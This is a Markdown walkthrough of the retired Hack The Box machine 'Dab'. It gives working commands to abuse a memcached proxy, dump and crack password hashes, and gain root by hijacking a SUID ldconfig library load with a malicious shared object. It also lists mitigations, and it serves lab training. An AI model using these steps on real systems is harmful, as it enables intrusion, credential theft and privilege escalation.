---
machine: Dab
os: Linux
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [linux, memcached, flask, ldconfig, suid]
---

# Dab — Hack The Box (Linux)

**English** | [🇪🇸 Español](README.md)

> **Status:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

The dev app on 8080 has a predictable cookie and a `/socket` proxy to localhost. That reaches memcached on 11211 and dumps users and MD5 hashes from the production app. Twelve passwords are cracked and one gives SSH. SUID `ldconfig` redirects a `myexec` library load and executes code as root.

## Reconnaissance

```bash
nmap -Pn -p- --min-rate 10000 <IP>
nmap -Pn -sCV -p<PORTS> <IP>
```

```text
21/tcp    ftp
22/tcp    ssh
80/tcp    http    nginx / Flask
8080/tcp  http    nginx / Flask dev
11211/tcp memcached (localhost, proxied)
```

## Enumeration

- Open FTP holds an image with hidden data; it is a distraction.
- The `password=secret` cookie grants access to the dev app.
- `/socket?port=<p>&cmd=<text>` runs `echo <text> | nc 127.0.0.1 <p>`.
- A port scan through the proxy finds 11211 and confirms memcached.

## Foothold

The production app uses memcached as its session store and its login is brute-forceable. After authentication, the session is stored in memcached. The proxy enumerates keys and extracts users and MD5 hashes.

```bash
curl -H 'Cookie: password=secret' 'http://<IP>:8080/socket?port=11211&cmd=stats'
curl -H 'Cookie: password=secret' 'http://<IP>:8080/socket?port=11211&cmd=get%20<KEY>'
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
ssh genevieve@<IP>
```

## Lateral movement

There is no further lateral movement: the chain stays on the same host. The cracked `genevieve` password is reused directly for SSH.

Local enumeration shows two SUID binaries: `ldconfig` and `myexec`. `myexec` prompts for a password and loads `libseclogin.so`; `ldconfig` can change the library search path.

## Privilege escalation

A custom `libseclogin.so` is compiled with a `seclogin()` function that calls `setuid(0)`, `setgid(0)` and `execl("/bin/sh")`. It is placed in `/dev/shm`, an `ldconfig` config file points at that directory, and `ldconfig -f` is run.

Running `myexec` resolves the malicious library and yields a root shell.

```bash
gcc -shared -fPIC -o /dev/shm/libseclogin.so lib.c
echo /dev/shm > /dev/shm/df.conf
ldconfig -f /dev/shm/df.conf
myexec
```

## Evidence

- Trimmed output from key commands; no flags, credentials or tokens.
- Real values, when present, live in `private/` and are not published.

## Lessons learned

- A weak authentication cookie is not authentication.
- A diagnostic proxy can expose services bound to localhost.
- Sessions in memcached can leak credentials when keys are enumerated.
- SUID `ldconfig` allows control over library resolution.

## Mitigations and detection

- Remove the static cookie and use signed server-side sessions.
- Restrict `/socket` to fixed destinations and ports, or remove it.
- Do not store sensitive data in memcached and isolate it on the network.
- Remove SUID from `ldconfig` and audit binaries with RPATH.

## References

- [0xdf — Dab](https://0xdf.gitlab.io/2019/02/02/htb-dab.html)
- [Video search (CSV)](https://www.youtube.com/results?search_query=ippsec+dab)
- [Writeup search (CSV)](https://medium.com/search?q=hackthebox+dab+writeup)
